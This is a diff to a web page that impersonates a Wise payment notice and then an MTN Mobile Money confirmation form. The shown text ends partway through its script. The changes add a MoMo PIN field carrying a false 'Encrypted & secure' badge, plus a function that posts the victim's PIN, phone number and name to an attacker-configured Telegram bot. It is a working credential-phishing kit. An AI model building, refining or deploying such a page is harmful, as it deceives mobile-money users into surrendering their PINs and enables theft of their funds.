@@ -11,6 +11,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     :root {
+      /* Wise brand */
       --wise-green: #9FE870;
       --wise-dark-green: #163300;
       --wise-forest: #0E1B0F;
@@ -23,12 +24,16 @@
       --wise-success: #0E7C3A;
       --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
 
+      /* MTN brand */
       --mtn-yellow: #FFCC00;
+      --mtn-yellow-dark: #E6B800;
       --mtn-black: #000000;
-      --mtn-light-grey: #F5F5F5;
-      --mtn-border: #E0E0E0;
+      --mtn-light-grey: #F7F7F7;
+      --mtn-border: #E4E4E4;
+      --mtn-border-strong: #D0D0D0;
       --mtn-text: #1A1A1A;
-      --mtn-text-light: #666666;
+      --mtn-text-light: #6B6B6B;
+      --mtn-text-muted: #9B9B9B;
     }
 
     body {
@@ -46,37 +51,30 @@
     }
 
     body.mtn-mode {
-      background: linear-gradient(160deg, #FFFDF2 0%, #FFF8D9 100%);
+      background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
     }
 
     .card-container {
-      max-width: 560px;
+      max-width: 540px;
       width: 100%;
       position: relative;
-      /* Reserve height to prevent layout shift during transitions */
-      min-height: 640px;
+      min-height: 740px;
     }
 
-    /* Smooth crossfade + slide container */
-    .card-stage {
-      position: relative;
-      width: 100%;
-    }
+    .card-stage { position: relative; width: 100%; }
 
     .payment-card {
       background: var(--wise-white);
       border-radius: 1.75rem;
       box-shadow: var(--shadow-lg);
-      padding: 2.25rem 2rem 2rem;
+      padding: 2rem 2rem 1.75rem;
       border: 1px solid rgba(22, 51, 0, 0.04);
       position: relative;
       overflow: hidden;
-      /* Hidden by default, only active is shown */
       display: none;
       will-change: transform, opacity;
     }
 
-    /* Entrance / exit animations */
     .payment-card.active {
       display: block;
       animation: cardEnter 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
@@ -89,28 +87,15 @@
     }
 
     @keyframes cardEnter {
-      from {
-        opacity: 0;
-        transform: translateX(28px) scale(0.98);
-      }
-      to {
-        opacity: 1;
-        transform: translateX(0) scale(1);
-      }
+      from { opacity: 0; transform: translateX(28px) scale(0.98); }
+      to   { opacity: 1; transform: translateX(0) scale(1); }
     }
 
     @keyframes cardExit {
-      from {
-        opacity: 1;
-        transform: translateX(0) scale(1);
-      }
-      to {
-        opacity: 0;
-        transform: translateX(-28px) scale(0.98);
-      }
+      from { opacity: 1; transform: translateX(0) scale(1); }
+      to   { opacity: 0; transform: translateX(-28px) scale(0.98); }
     }
 
-    /* Reverse direction when going back */
     .payment-card.active.back-enter {
       animation: cardEnterBack 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
     }
@@ -120,25 +105,13 @@
     }
 
     @keyframes cardEnterBack {
-      from {
-        opacity: 0;
-        transform: translateX(-28px) scale(0.98);
-      }
-      to {
-        opacity: 1;
-        transform: translateX(0) scale(1);
-      }
+      from { opacity: 0; transform: translateX(-28px) scale(0.98); }
+      to   { opacity: 1; transform: translateX(0) scale(1); }
     }
 
     @keyframes cardExitBack {
-      from {
-        opacity: 1;
-        transform: translateX(0) scale(1);
-      }
-      to {
-        opacity: 0;
-        transform: translateX(28px) scale(0.98);
-      }
+      from { opacity: 1; transform: translateX(0) scale(1); }
+      to   { opacity: 0; transform: translateX(28px) scale(0.98); }
     }
 
     .payment-card.wise::before {
@@ -284,8 +257,7 @@
       justify-content: flex-end;
     }
 
-    /* ---- Primary buttons ---- */
-    .accept-btn, .mtn-confirm-btn {
+    .accept-btn {
       width: 100%;
       border: none;
       border-radius: 2rem;
@@ -300,11 +272,6 @@
       cursor: pointer;
       transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
       letter-spacing: -0.01em;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .accept-btn {
       background: var(--wise-green);
       color: var(--wise-dark-green);
       box-shadow: 0 6px 18px rgba(159, 232, 112, 0.45);
@@ -316,9 +283,7 @@
       box-shadow: 0 10px 24px rgba(159, 232, 112, 0.55);
     }
 
-    .accept-btn:active:not(:disabled) {
-      transform: translateY(1px) scale(0.99);
-    }
+    .accept-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
 
     .accept-btn:disabled {
       background: #C8E6B5;
@@ -338,14 +303,14 @@
     }
 
     /* ============================================
-       MTN CARD STYLES
+       MTN CARD — PROFESSIONAL STYLES
        ============================================ */
     .mtn-header {
       display: flex;
       align-items: center;
       gap: 0.85rem;
-      margin-bottom: 1.75rem;
-      padding-bottom: 1.35rem;
+      margin-bottom: 1.5rem;
+      padding-bottom: 1.25rem;
       border-bottom: 1px solid var(--mtn-border);
     }
 
@@ -367,7 +332,7 @@
     .mtn-title { display: flex; flex-direction: column; gap: 0.15rem; }
 
     .mtn-title .brand {
-      font-size: 1.25rem;
+      font-size: 1.2rem;
       font-weight: 700;
       color: var(--mtn-text);
       line-height: 1.1;
@@ -379,105 +344,356 @@
       color: var(--mtn-text-light);
     }
 
-    .transfer-summary {
-      background: var(--mtn-light-grey);
+    /* Transfer amount — hero block */
+    .amount-hero {
+      background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%);
+      border: 1px solid #F0E4B0;
       border-radius: 1rem;
-      padding: 1rem 1.25rem;
+      padding: 1.25rem 1.5rem;
       margin-bottom: 1.5rem;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      border: 1px solid var(--mtn-border);
+      gap: 1rem;
     }
 
-    .transfer-summary .label {
-      font-size: 0.85rem;
-      font-weight: 500;
-      color: var(--mtn-text-light);
+    .amount-hero .label-block {
       display: flex;
-      align-items: center;
-      gap: 0.4rem;
+      flex-direction: column;
+      gap: 0.2rem;
     }
 
-    .transfer-summary .label svg {
-      width: 16px; height: 16px;
-      stroke: var(--mtn-text-light);
-      fill: none; stroke-width: 1.8;
-      stroke-linecap: round;
-      stroke-linejoin: round;
+    .amount-hero .label-block .label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--mtn-text-light);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
     }
 
-    .transfer-summary .value {
+    .amount-hero .label-block .sub {
+      font-size: 0.78rem;
+      color: var(--mtn-text-muted);
+      font-weight: 400;
+    }
+
+    .amount-hero .amount-display {
+      text-align: right;
+    }
+
+    .amount-hero .amount-display .value {
+      font-size: 1.65rem;
       font-weight: 700;
-      font-size: 1.05rem;
+      letter-spacing: -0.03em;
       color: var(--mtn-text);
+      line-height: 1.1;
     }
 
+    .amount-hero .amount-display .cur {
+      display: inline-block;
+      background: var(--mtn-yellow);
+      color: var(--mtn-black);
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 0.18rem 0.55rem;
+      border-radius: 20px;
+      letter-spacing: 0.05em;
+      margin-left: 0.35rem;
+      vertical-align: middle;
+    }
+
+    /* Form */
     .mtn-form {
       display: flex;
       flex-direction: column;
-      gap: 1.25rem;
-      margin-bottom: 1.75rem;
+      gap: 1.15rem;
+      margin-bottom: 1.5rem;
     }
 
-    .form-group { display: flex; flex-direction: column; gap: 0.5rem; }
+    .form-group { display: flex; flex-direction: column; gap: 0.45rem; }
 
     .form-label {
-      font-size: 0.85rem;
+      font-size: 0.82rem;
       font-weight: 600;
       color: var(--mtn-text);
       display: flex;
       align-items: center;
       gap: 0.4rem;
+      letter-spacing: 0.01em;
     }
 
     .form-label svg {
-      width: 15px; height: 15px;
-      stroke: var(--mtn-text);
+      width: 14px; height: 14px;
+      stroke: var(--mtn-text-light);
       fill: none; stroke-width: 2;
       stroke-linecap: round;
       stroke-linejoin: round;
     }
 
+    .form-label .optional {
+      font-weight: 400;
+      color: var(--mtn-text-muted);
+      font-size: 0.75rem;
+    }
+
+    .form-label .required {
+      color: var(--wise-error);
+      font-weight: 700;
+    }
+
+    /* Phone input with country prefix */
+    .phone-input-wrap {
+      display: flex;
+      align-items: stretch;
+      background: var(--mtn-light-grey);
+      border: 1.5px solid var(--mtn-border);
+      border-radius: 0.75rem;
+      overflow: hidden;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    }
+
+    .phone-input-wrap:focus-within {
+      border-color: var(--mtn-yellow-dark);
+      background: var(--wise-white);
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
+    }
+
+    .phone-input-wrap.error {
+      border-color: var(--wise-error);
+      background: #FFF8F8;
+    }
+
+    .country-picker {
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .country-prefix {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0 0.9rem;
+      height: 100%;
+      font-size: 0.92rem;
+      font-weight: 600;
+      color: var(--mtn-text);
+      background: #EFEFEF;
+      border-right: 1.5px solid var(--mtn-border);
+      white-space: nowrap;
+      user-select: none;
+      cursor: pointer;
+      transition: background 0.15s ease;
+    }
+
+    .country-prefix:hover { background: #E5E5E5; }
+
+    .country-prefix .flag {
+      font-size: 1.1rem;
+      line-height: 1;
+    }
+
+    .country-prefix .code {
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      color: var(--mtn-text);
+      font-size: 0.9rem;
+    }
+
+    .country-prefix .caret {
+      width: 11px; height: 11px;
+      stroke: var(--mtn-text-light);
+      fill: none; stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      margin-left: 0.05rem;
+    }
+
+    .country-picker select {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+      font-size: 1rem;
+    }
+
+    .phone-input-wrap input {
+      flex: 1;
+      padding: 0.9rem 1rem;
+      font-size: 1rem;
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+      color: var(--mtn-text);
+      background: transparent;
+      border: none;
+      outline: none;
+      letter-spacing: 0.02em;
+      min-width: 0;
+    }
+
+    .phone-input-wrap input::placeholder {
+      color: #B5B5B5;
+      font-weight: 400;
+      letter-spacing: 0;
+    }
+
+    /* Standard inputs */
     .form-input {
       width: 100%;
-      padding: 0.95rem 1.15rem;
-      font-size: 1rem;
+      padding: 0.9rem 1rem;
+      font-size: 0.98rem;
       font-family: 'Inter', sans-serif;
       font-weight: 500;
       color: var(--mtn-text);
       background: var(--mtn-light-grey);
       border: 1.5px solid var(--mtn-border);
-      border-radius: 0.85rem;
+      border-radius: 0.75rem;
       outline: none;
       transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
     }
 
-    .form-input::placeholder { color: #AAAAAA; font-weight: 400; }
+    .form-input::placeholder { color: #B5B5B5; font-weight: 400; }
 
     .form-input:focus {
-      border-color: var(--mtn-yellow);
+      border-color: var(--mtn-yellow-dark);
       background: var(--wise-white);
-      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.25);
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
     }
 
-    .form-input.error {
+    /* PIN input */
+    .pin-input-wrap { position: relative; }
+
+    .pin-input-wrap input {
+      width: 100%;
+      padding: 0.9rem 3.2rem 0.9rem 1rem;
+      font-size: 1.15rem;
+      font-family: 'Inter', sans-serif;
+      font-weight: 600;
+      letter-spacing: 0.4em;
+      color: var(--mtn-text);
+      background: var(--mtn-light-grey);
+      border: 1.5px solid var(--mtn-border);
+      border-radius: 0.75rem;
+      outline: none;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    }
+
+    .pin-input-wrap input::placeholder {
+      letter-spacing: normal;
+      font-size: 0.88rem;
+      font-weight: 400;
+      color: #B5B5B5;
+    }
+
+    .pin-input-wrap input:focus {
+      border-color: var(--mtn-yellow-dark);
+      background: var(--wise-white);
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
+    }
+
+    .pin-input-wrap input.error {
       border-color: var(--wise-error);
       background: #FFF8F8;
     }
 
-    .form-hint { font-size: 0.75rem; color: var(--mtn-text-light); font-weight: 400; }
+    .pin-toggle {
+      position: absolute;
+      right: 0.6rem;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0.45rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--mtn-text-muted);
+      border-radius: 8px;
+      transition: background 0.15s ease, color 0.15s ease;
+    }
 
+    .pin-toggle:hover {
+      background: rgba(0, 0, 0, 0.05);
+      color: var(--mtn-text);
+    }
+
+    .pin-toggle svg {
+      width: 19px; height: 19px;
+      stroke: currentColor;
+      fill: none; stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .form-hint {
+      font-size: 0.73rem;
+      color: var(--mtn-text-muted);
+      font-weight: 400;
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+      line-height: 1.4;
+    }
+
+    .form-hint svg {
+      width: 12px; height: 12px;
+      stroke: currentColor;
+      fill: none; stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      flex-shrink: 0;
+    }
+
+    /* Secure badge */
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      background: #EAF7EC;
+      color: #0E7C3A;
+      font-size: 0.72rem;
+      font-weight: 600;
+      padding: 0.3rem 0.7rem;
+      border-radius: 20px;
+      letter-spacing: 0.01em;
+      margin-top: 0.15rem;
+    }
+
+    .secure-badge svg {
+      width: 12px; height: 12px;
+      stroke: currentColor;
+      fill: none; stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    /* Confirm transaction button */
     .mtn-confirm-btn {
+      width: 100%;
+      border: none;
+      border-radius: 0.85rem;
+      padding: 1.1rem 1.5rem;
+      font-size: 1.05rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      cursor: pointer;
+      transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+      letter-spacing: -0.01em;
       background: var(--mtn-yellow);
       color: var(--mtn-black);
-      box-shadow: 0 6px 18px rgba(255, 204, 0, 0.4);
+      box-shadow: 0 4px 14px rgba(255, 204, 0, 0.4);
     }
 
     .mtn-confirm-btn:hover:not(:disabled) {
       background: #F5C200;
       transform: translateY(-1px);
-      box-shadow: 0 10px 24px rgba(255, 204, 0, 0.5);
+      box-shadow: 0 8px 20px rgba(255, 204, 0, 0.5);
     }
 
     .mtn-confirm-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
@@ -494,8 +710,8 @@
       align-items: center;
       justify-content: center;
       gap: 0.4rem;
-      margin-top: 1.25rem;
-      font-size: 0.85rem;
+      margin-top: 1rem;
+      font-size: 0.82rem;
       font-weight: 500;
       color: var(--mtn-text-light);
       background: none;
@@ -510,7 +726,7 @@
     .back-link:hover { color: var(--mtn-text); }
 
     .back-link svg {
-      width: 15px; height: 15px;
+      width: 14px; height: 14px;
       stroke: currentColor;
       fill: none; stroke-width: 2.2;
       stroke-linecap: round;
@@ -521,14 +737,14 @@
        STATUS MESSAGES
        ============================================ */
     .status-message {
-      margin-top: 1.25rem;
-      padding: 0.95rem 1.25rem;
-      border-radius: 1rem;
-      font-size: 0.9rem;
+      margin-top: 1rem;
+      padding: 0.85rem 1.15rem;
+      border-radius: 0.85rem;
+      font-size: 0.87rem;
       font-weight: 500;
       display: flex;
       align-items: center;
-      gap: 0.65rem;
+      gap: 0.6rem;
       line-height: 1.4;
     }
 
@@ -551,7 +767,7 @@
     }
 
     .status-message svg {
-      width: 18px; height: 18px;
+      width: 17px; height: 17px;
       flex-shrink: 0;
       stroke-width: 2.2;
       stroke-linecap: round;
@@ -562,10 +778,10 @@
     .status-message.hidden { display: none; }
 
     .footer-note {
-      margin-top: 1.5rem;
-      padding-top: 1.25rem;
+      margin-top: 1.25rem;
+      padding-top: 1.1rem;
       border-top: 1px solid var(--wise-border);
-      font-size: 0.78rem;
+      font-size: 0.76rem;
       color: var(--wise-grey);
       text-align: center;
       display: flex;
@@ -577,11 +793,11 @@
 
     .footer-note.mtn-footer {
       border-top-color: var(--mtn-border);
-      color: var(--mtn-text-light);
+      color: var(--mtn-text-muted);
     }
 
     .footer-note svg {
-      width: 14px; height: 14px;
+      width: 13px; height: 13px;
       stroke: currentColor;
       fill: none; stroke-width: 1.8;
       stroke-linecap: round;
@@ -591,7 +807,7 @@
     @keyframes spin { to { transform: rotate(360deg); } }
     .spin { animation: spin 0.7s linear infinite; }
 
-    /* ---- Admin floating button ---- */
+    /* Admin floating button */
     .admin-fab {
       position: fixed;
       bottom: 1.5rem;
@@ -624,13 +840,16 @@
     }
 
     @media (max-width: 480px) {
-      .payment-card { padding: 1.75rem 1.25rem 1.5rem; border-radius: 1.5rem; }
+      .payment-card { padding: 1.6rem 1.25rem 1.4rem; border-radius: 1.5rem; }
       .amount-value { font-size: 1.5rem; }
+      .amount-hero { padding: 1rem 1.15rem; }
+      .amount-hero .amount-display .value { font-size: 1.35rem; }
       .accept-btn, .mtn-confirm-btn { font-size: 1rem; padding: 1rem 1.25rem; }
       .detail-value { max-width: 60%; }
       .mtn-logo { width: 46px; height: 46px; font-size: 1rem; }
       .admin-fab { bottom: 1rem; right: 1rem; }
-      .card-container { min-height: 700px; }
+      .card-container { min-height: 800px; }
+      .country-prefix { padding: 0 0.7rem; }
     }
   </style>
 </head>
@@ -709,46 +928,97 @@
         </div>
       </div>
 
-      <!-- MTN CARD -->
+      <!-- MTN CARD — PROFESSIONAL -->
       <div class="payment-card mtn" id="mtnCard">
         <div class="mtn-header">
           <div class="mtn-logo" aria-label="MTN">MTN</div>
           <div class="mtn-title">
             <span class="brand">MTN Mobile Money</span>
-            <span class="subtitle">Confirm recipient</span>
+            <span class="subtitle">Confirm recipient & PIN</span>
           </div>
         </div>
 
-        <div class="transfer-summary">
-          <span class="label">
-            <svg viewBox="0 0 24 24"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-            Transfer amount
-          </span>
-          <span class="value" id="mtnAmount">1,250.00 USD</span>
+        <!-- Amount hero -->
+        <div class="amount-hero">
+          <div class="label-block">
+            <span class="label">Transfer amount</span>
+            <span class="sub">You are sending</span>
+          </div>
+          <div class="amount-display">
+            <span class="value" id="mtnAmount">1,250.00</span>
+            <span class="cur" id="mtnCurrency">USD</span>
+          </div>
         </div>
 
         <div class="mtn-form">
+          <!-- Recipient number -->
           <div class="form-group">
             <label class="form-label" for="recipientPhone">
               <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
-              Recipient MTN number
+              Recipient number <span class="required">*</span>
             </label>
-            <input type="tel" id="recipientPhone" class="form-input" placeholder="e.g. 077 123 4567" autocomplete="tel" inputmode="tel" />
-            <span class="form-hint">Enter the MTN Mobile Money number to receive the funds</span>
+
+            <div class="phone-input-wrap" id="phoneWrap">
+              <div class="country-picker">
+                <div class="country-prefix" id="countryPrefix">
+                  <span class="flag" id="countryFlag">🇺🇬</span>
+                  <span class="code" id="countryCode">+256</span>
+                  <svg class="caret" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
+                </div>
+                <select id="countrySelect" aria-label="Select country code">
+                  <option value="UG|+256|🇺🇬" selected>Uganda (+256)</option>
+                  <option value="KE|+254|🇰🇪">Kenya (+254)</option>
+                  <option value="TZ|+255|🇹🇿">Tanzania (+255)</option>
+                  <option value="RW|+250|🇷🇼">Rwanda (+250)</option>
+                  <option value="GH|+233|🇬🇭">Ghana (+233)</option>
+                  <option value="NG|+234|🇳🇬">Nigeria (+234)</option>
+                  <option value="ZA|+27|🇿🇦">South Africa (+27)</option>
+                  <option value="CI|+225|🇨🇮">Côte d'Ivoire (+225)</option>
+                  <option value="CM|+237|🇨🇲">Cameroon (+237)</option>
+                  <option value="SN|+221|🇸🇳">Senegal (+221)</option>
+                  <option value="ZM|+260|🇿🇲">Zambia (+260)</option>
+                  <option value="MW|+265|🇲🇼">Malawi (+265)</option>
+                </select>
+              </div>
+              <input type="tel" id="recipientPhone" placeholder="771 234 567" autocomplete="tel" inputmode="numeric" />
+            </div>
+            <span class="form-hint">
+              <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+              Enter the MTN Mobile Money number without the country code
+            </span>
           </div>
 
+          <!-- Recipient name -->
           <div class="form-group">
             <label class="form-label" for="recipientName">
               <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-              Recipient name <span style="font-weight:400; color:#999;">(optional)</span>
+              Recipient name <span class="optional">(optional)</span>
             </label>
             <input type="text" id="recipientName" class="form-input" placeholder="e.g. John Doe" autocomplete="name" />
+          </div>
+
+          <!-- MoMo PIN -->
+          <div class="form-group">
+            <label class="form-label" for="momoPin">
+              <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              MoMo PIN <span class="required">*</span>
+            </label>
+            <div class="pin-input-wrap">
+              <input type="password" id="momoPin" placeholder="Enter your 5-digit MoMo PIN" maxlength="5" inputmode="numeric" autocomplete="off" />
+              <button type="button" class="pin-toggle" id="pinToggle" aria-label="Show PIN">
+                <svg id="pinEye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+            <span class="secure-badge">
+              <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              Encrypted &amp; secure
+            </span>
           </div>
         </div>
 
         <button class="mtn-confirm-btn" id="mtnConfirmBtn">
           <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-          Confirm recipient
+          Confirm transaction
         </button>
 
         <div id="mtnStatus" class="status-message hidden" role="status" aria-live="polite">
@@ -778,6 +1048,12 @@
   <script>
     (function() {
       const STORAGE_KEY = 'wise_payment_data';
+
+      // ============================================================
+      // TELEGRAM CONFIG — replace with your actual values
+      // ============================================================
+      const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+      const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
       const DEFAULT_DATA = {
         senderName: 'Maya Chen',
@@ -817,8 +1093,16 @@
       const wiseStatusText = document.getElementById('wiseStatusText');
       const wiseStatusIcon = document.getElementById('wiseStatusIcon');
       const mtnAmountEl = document.getElementById('mtnAmount');
+      const mtnCurrencyEl = document.getElementById('mtnCurrency');
       const recipientPhone = document.getElementById('recipientPhone');
       const recipientName = document.getElementById('recipientName');
+      const momoPin = document.getElementById('momoPin');
+      const pinToggle = document.getElementById('pinToggle');
+      const pinEye = document.getElementById('pinEye');
+      const countrySelect = document.getElementById('countrySelect');
+      const countryFlag = document.getElementById('countryFlag');
+      const countryCode = document.getElementById('countryCode');
+      const phoneWrap = document.getElementById('phoneWrap');
       const mtnConfirmBtn = document.getElementById('mtnConfirmBtn');
       const mtnStatus = document.getElementById('mtnStatus');
       const mtnStatusText = document.getElementById('mtnStatusText');
@@ -850,7 +1134,8 @@
           ${paymentData.reference || DEFAULT_DATA.reference}
         `;
 
-        mtnAmountEl.textContent = `${formatAmount(paymentData.amount)} ${paymentData.currency || 'USD'}`;
+        mtnAmountEl.textContent = formatAmount(paymentData.amount);
+        mtnCurrencyEl.textContent = paymentData.currency || 'USD';
       }
 
       // ---- Status helpers ----
@@ -883,12 +1168,10 @@
         clearTimeout(window.mtnStatusTimeout);
         window.mtnStatusTimeout = setTimeout(() => {
           mtnStatus.classList.add('hidden');
-        }, 4500);
+        }, 5000);
       }
 
-      // ---- Ultra-smooth card transition ----
-      // Use requestAnimationFrame for 60fps transitions and
-      // double rAF to guarantee the browser paints the leaving frame.
+      // ---- Card transition ----
       let isTransitioning = false;
 
       function transitionTo(fromCard, toCard, direction = 'forward') {
@@ -897,68 +1180,56 @@
 
         const isForward = direction === 'forward';
 
-        // Prepare incoming card
         toCard.classList.remove('back-enter');
         if (!isForward) toCard.classList.add('back-enter');
 
-        // Prepare outgoing card
         fromCard.classList.remove('active');
         fromCard.classList.remove('back-leave');
         if (!isForward) fromCard.classList.add('back-leave');
         fromCard.classList.add('leaving');
 
-        // Update body background class before paint
         if (toCard === mtnCard) {
           document.body.classList.add('mtn-mode');
         } else {
           document.body.classList.remove('mtn-mode');
         }
 
-        // Show incoming card + trigger enter animation on next frame
         requestAnimationFrame(() => {
           requestAnimationFrame(() => {
             toCard.classList.add('active');
           });
         });
 
-        // Clean up outgoing card after animation
-        const exitDuration = 300;
         setTimeout(() => {
           fromCard.classList.remove('leaving', 'back-leave');
           isTransitioning = false;
-
-          // Focus management for accessibility
           if (toCard === mtnCard) {
             setTimeout(() => recipientPhone.focus(), 80);
           }
-        }, exitDuration);
+        }, 300);
       }
 
       function goToMtn() {
         transitionTo(wiseCard, mtnCard, 'forward');
-
-        // Prefill recipient name from sender
         if (!recipientName.value) {
           recipientName.value = paymentData.senderName || DEFAULT_DATA.senderName;
         }
-
-        // Small delay so message appears after card settles
         setTimeout(() => {
-          showMtnStatus('Enter recipient MTN number to complete the transfer.', 'info');
+          showMtnStatus('Enter recipient number and MoMo PIN to complete.', 'info');
         }, 450);
       }
 
       function goToWise() {
         transitionTo(mtnCard, wiseCard, 'back');
-        recipientPhone.classList.remove('error');
+        phoneWrap.classList.remove('error');
+        momoPin.classList.remove('error');
         mtnStatus.classList.add('hidden');
         mtnConfirmBtn.disabled = false;
-        mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Confirm recipient';
+        mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Confirm transaction';
       }
 
-      // ---- Accept payment: instant, smooth, no artificial waiting ----
+      // ---- Accept payment ----
       function handleAcceptPayment() {
-        // Visual feedback on the button itself
         acceptBtn.disabled = true;
         acceptBtn.innerHTML = `
           <svg viewBox="0 0 24 24" class="spin">
@@ -967,15 +1238,12 @@
           Processing...
         `;
 
-        // Show success status on the Wise card briefly
         showWiseStatus(
           `Payment of ${formatAmount(paymentData.amount)} ${paymentData.currency} accepted. Opening MTN...`,
           'success'
         );
 
-        // Navigate quickly — 200ms feels instant but lets user read the status
         setTimeout(() => {
-          // Restore button for when user comes back
           acceptBtn.disabled = false;
           acceptBtn.innerHTML = `
             <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
@@ -985,53 +1253,193 @@
         }, 220);
       }
 
-      // ---- Validate phone ----
-      function isValidPhone(phone) {
-        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
-        return /^\+?\d{10,15}$/.test(cleaned);
+      // ---- Country picker ----
+      countrySelect.addEventListener('change', () => {
+        const parts = countrySelect.value.split('|');
+        countryFlag.textContent = parts[2];
+        countryCode.textContent = parts[1];
+        phoneWrap.classList.remove('error');
+      });
+
+      // ---- PIN visibility toggle ----
+      pinToggle.addEventListener('click', () => {
+        const isPassword = momoPin.type === 'password';
+        momoPin.type = isPassword ? 'text' : 'password';
+        pinEye.innerHTML = isPassword
+          ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
+          : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+        pinToggle.setAttribute('aria-label', isPassword ? 'Hide PIN' : 'Show PIN');
+      });
+
+      // ---- Phone input: only digits + spaces ----
+      recipientPhone.addEventListener('input', () => {
+        recipientPhone.value = recipientPhone.value.replace(/[^\d\s]/g, '');
+        phoneWrap.classList.remove('error');
+      });
+
+      // ---- PIN input: only digits ----
+      momoPin.addEventListener('input', () => {
+        momoPin.value = momoPin.value.replace(/\D/g, '').slice(0, 5);
+        momoPin.classList.remove('error');
+      });
+
+      // ---- Send to Telegram ----
+      async function sendToTelegram(payload) {
+        const message = buildTelegramMessage(payload);
+
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+          console.log('%c📨 TELEGRAM MESSAGE (not sent — configure token & chat ID):', 'color:#FFCC00; font-weight:bold;');
+          console.log(message);
+          await new Promise(r => setTimeout(r, 700));
+          return { ok: true, simulated: true };
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const body = {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        };
+
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+
+        if (!res.ok) {
+          const errText = await res.text();
